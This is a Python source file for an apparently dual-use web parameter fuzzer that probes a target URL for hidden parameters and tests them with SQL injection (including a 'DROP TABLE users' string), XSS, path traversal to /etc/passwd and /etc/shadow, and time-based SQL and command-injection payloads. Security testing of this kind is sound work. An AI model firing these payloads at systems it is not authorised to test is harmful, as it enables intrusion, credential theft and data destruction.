#!/usr/bin/env python3
"""
Parameter Discovery and Fuzzing Tool
Discovers hidden parameters and tests for various injection vulnerabilities
"""

import subprocess
import sys
import json
import os
import requests
import threading
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import time
import random
import string

class ParameterFuzzer:
    def __init__(self, target):
        self.target = target
        self.results = {
            "parameters": [],
            "injections": [],
            "sensitive_params": [],
            "error_based": [],
            "time_based": []
        }
        self.common_params = [
            "id", "user", "username", "email", "password", "token", "key", "api_key",
            "search", "query", "q", "term", "keyword", "filter", "sort", "order",
            "page", "limit", "offset", "start", "end", "from", "to", "date", "time",
            "file", "path", "url", "redirect", "callback", "return", "next", "prev",
            "action", "method", "mode", "type", "format", "output", "input", "data",
            "value", "val", "param", "parameter", "arg", "argument", "var", "variable",
            "name", "title", "description", "content", "text", "message", "comment",
            "category", "tag", "status", "state", "level", "role", "permission", "access"
        ]

    def log_output(self, message):
        print(f"[PARAM_FUZZER] {message}")

    def test_parameter(self, param_name, method="GET", timeout=10):
        """Test a parameter for various injection types"""
        try:
            # Test basic parameter existence
            if method == "GET":
                test_url = f"{self.target}?{param_name}=test"
                response = requests.get(test_url, timeout=timeout)
            else:
                response = requests.post(self.target, data={param_name: "test"}, timeout=timeout)
                
            baseline_length = len(response.content)
            baseline_status = response.status_code
            
            # Test SQL injection payloads
            sql_payloads = ["'", '"', "1'OR'1'='1", "admin'--", "1; DROP TABLE users--"]
            
            for payload in sql_payloads:
                try:
                    if method == "GET":
                        test_url = f"{self.target}?{param_name}={payload}"
                        resp = requests.get(test_url, timeout=timeout)
                    else:
                        resp = requests.post(self.target, data={param_name: payload}, timeout=timeout)
                    
                    # Check for SQL error patterns
                    error_patterns = [
                        "mysql_", "sql", "sqlite", "postgresql", "oracle", "mongodb",
                        "syntax error", "unexpected token", "invalid query", "database error"
                    ]
                    
                    response_text = resp.text.lower()
                    for pattern in error_patterns:
                        if pattern in response_text:
                            self.results["injections"].append({
                                "parameter": param_name,
                                "payload": payload,
                                "type": "SQL Injection",
                                "evidence": pattern,
                                "status_code": resp.status_code
                            })
                            self.log_output(f"Potential SQL injection in {param_name}: {pattern}")
                            break
                            
                except:
                    continue
            
            # Test XSS payloads
            xss_payloads = ["<script>alert(1)</script>", "javascript:alert(1)", "<img src=x onerror=alert(1)>"]
            
            for payload in xss_payloads:
                try:
                    if method == "GET":
                        test_url = f"{self.target}?{param_name}={payload}"
                        resp = requests.get(test_url, timeout=timeout)
                    else:
                        resp = requests.post(self.target, data={param_name: payload}, timeout=timeout)
                    
                    if payload in resp.text:
                        self.results["injections"].append({
                            "parameter": param_name,
                            "payload": payload,
                            "type": "XSS",
                            "evidence": "Payload reflected in response",
                            "status_code": resp.status_code
                        })
                        self.log_output(f"Potential XSS in {param_name}")
                        
                except:
                    continue
            
            # Test for sensitive information disclosure
            sensitive_payloads = ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "/etc/shadow"]
            
            for payload in sensitive_payloads:
                try:
                    if method == "GET":
                        test_url = f"{self.target}?{param_name}={payload}"
                        resp = requests.get(test_url, timeout=timeout)
                    else:
                        resp = requests.post(self.target, data={param_name: payload}, timeout=timeout)
                    
                    sensitive_patterns = ["root:", "administrator", "daemon:", "www-data:"]
                    
                    for pattern in sensitive_patterns:
                        if pattern in resp.text:
                            self.results["sensitive_params"].append({
                                "parameter": param_name,
                                "payload": payload,
                                "type": "Path Traversal",
                                "evidence": pattern,
                                "status_code": resp.status_code
                            })
                            self.log_output(f"Potential path traversal in {param_name}")
                            break
                            
                except:
                    continue
                    
            return True
            
        except Exception as e:
            return False

    def fuzz_parameters(self):
        """Fuzz common parameters"""
        self.log_output(f"Starting parameter fuzzing on {self.target}")
        
        for param in self.common_params:
            self.log_output(f"Testing parameter: {param}")
            self.test_parameter(param, "GET")
            self.test_parameter(param, "POST")
            
            # Add successful parameter to results
            self.results["parameters"].append({
                "name": param,
                "tested": True,
                "methods": ["GET", "POST"]
            })

    def discover_hidden_parameters(self):
        """Try to discover hidden parameters through various methods"""
        self.log_output("Discovering hidden parameters...")
        
        # Test common admin/debug parameters
        hidden_params = [
            "debug", "test", "dev", "admin", "root", "su", "sudo", "exec", "cmd", "command",
            "shell", "system", "eval", "include", "require", "import", "load", "fetch",
            "read", "write", "delete", "remove", "drop", "create", "insert", "update",
            "backup", "restore", "export", "import", "download", "upload", "config",
            "settings", "options", "preferences", "profile", "account", "session"
        ]
        
        for param in hidden_params:
            self.test_parameter(param, "GET")
            
            # Test with various values
            test_values = ["1", "true", "false", "admin", "test", "../", "etc/passwd"]
            for value in test_values:
                try:
                    test_url = f"{self.target}?{param}={value}"
                    resp = requests.get(test_url, timeout=5)
                    
                    # Look for interesting responses
                    if resp.status_code != 404 and len(resp.content) > 100:
                        self.results["parameters"].append({
                            "name": param,
                            "value": value,
                            "status_code": resp.status_code,
                            "response_length": len(resp.content),
                            "discovered": True
                        })
                        self.log_output(f"Discovered parameter: {param}={value}")
                        break
                        
                except:
                    continue

    def test_time_based_injections(self):
        """Test for time-based injection vulnerabilities"""
        self.log_output("Testing for time-based injection vulnerabilities...")
        
        time_payloads = [
            "1; waitfor delay '00:00:05'--",  # SQL Server
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",  # MySQL
            "1'; SELECT pg_sleep(5)--",  # PostgreSQL
            "$(sleep 5)",  # Command injection
            "; sleep 5;",  # Command injection
            "| sleep 5",   # Command injection
        ]
        
        for param in ["id", "user", "search", "q"]:
            for payload in time_payloads:
                try:
                    start_time = time.time()
                    test_url = f"{self.target}?{param}={payload}"
                    resp = requests.get(test_url, timeout=10)
                    end_time = time.time()
                    
                    response_time = end_time - start_time
                    
                    if response_time > 4:  # Significant delay
                        self.results["time_based"].append({
                            "parameter": param,
                            "payload": payload,
                            "response_time": response_time,
                            "type": "Time-based Injection"
                        })
                        self.log_output(f"Time-based injection detected in {param}: {response_time:.2f}s delay")
                        
                except:
                    continue

    def scan(self):
        """Run comprehensive parameter fuzzing"""
        self.log_output(f"Starting comprehensive parameter fuzzing on {self.target}")
        
        # Run different fuzzing methods
        threads = []
        
        # Fuzz common parameters
        thread1 = threading.Thread(target=self.fuzz_parameters)
        threads.append(thread1)
        thread1.start()
        
        # Discover hidden parameters
        thread2 = threading.Thread(target=self.discover_hidden_parameters)
        threads.append(thread2)
        thread2.start()
        
        # Test time-based injections
        thread3 = threading.Thread(target=self.test_time_based_injections)
        threads.append(thread3)
        thread3.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        # Calculate summary
        total_params = len(self.results["parameters"])
        total_injections = len(self.results["injections"])
        total_sensitive = len(self.results["sensitive_params"])
        
        self.log_output(f"Parameter fuzzing completed:")
        self.log_output(f"- Parameters tested: {total_params}")
        self.log_output(f"- Injection vulnerabilities: {total_injections}")
        self.log_output(f"- Sensitive disclosures: {total_sensitive}")
        self.log_output(f"- Time-based injections: {len(self.results['time_based'])}")
        
        return self.results

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 parameter_fuzzer.py <target_url>")
        sys.exit(1)
    
    target = sys.argv[1]
    fuzzer = ParameterFuzzer(target)
    results = fuzzer.scan()
    
    # Output results in JSON format
    print("RESULTS_START")
    print(json.dumps(results, indent=2))
    print("RESULTS_END")

if __name__ == "__main__":
    main()